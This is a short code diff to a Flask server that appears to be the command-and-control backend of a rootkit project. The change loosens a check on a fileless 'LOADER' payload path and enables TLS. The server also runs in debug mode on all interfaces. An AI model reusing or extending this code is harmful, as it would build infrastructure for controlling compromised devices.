@@ -424,7 +424,7 @@ def receive_artifact():
                     status_update = 'failure'
 
         elif artifact_type == 'LOADER':
-            if isinstance(artifact_data, list) and len(artifact_data) == 1 and isinstance(artifact_data[0], str) and artifact_data[0] == "/proc/self/fd/4":
+            if isinstance(artifact_data, list) and len(artifact_data) == 1 and isinstance(artifact_data[0], str) and "/proc/self/fd/" in artifact_data[0]:
                 responses.append({'status': 'success', 'message': 'LOADER payload is as expected'})
             else:
                 app.logger.error('Invalid data format for LOADER')
@@ -779,7 +779,7 @@ def delete_campaign(device_name):
 # Run server
 if __name__ == '__main__':
     #import IPython; IPython.embed()
-    import venv
+    #import venv
     #print(open(r'C:\Users\Daniel.Hay\Desktop\AmazingRootkit\amazing_rootkit\cert.pem','rb').read(100))
-    #app.run(debug=True, host='0.0.0.0',port=1234,ssl_context=(r'C:\Users\Daniel.Hay\Desktop\AmazingRootkit\amazing_rootkit\cert.pem', r'C:\Users\Daniel.Hay\Desktop\AmazingRootkit\amazing_rootkit\key.pem'))
-    app.run(debug=True, host='0.0.0.0',port=1234)
+    app.run(debug=True, host='0.0.0.0',port=1234,ssl_context=(r'C:\Users\Daniel.Hay\Desktop\AmazingRootkit\amazing_rootkit\cert.pem', r'C:\Users\Daniel.Hay\Desktop\AmazingRootkit\amazing_rootkit\key.pem'))
+    #app.run(debug=True, host='0.0.0.0',port=1234)
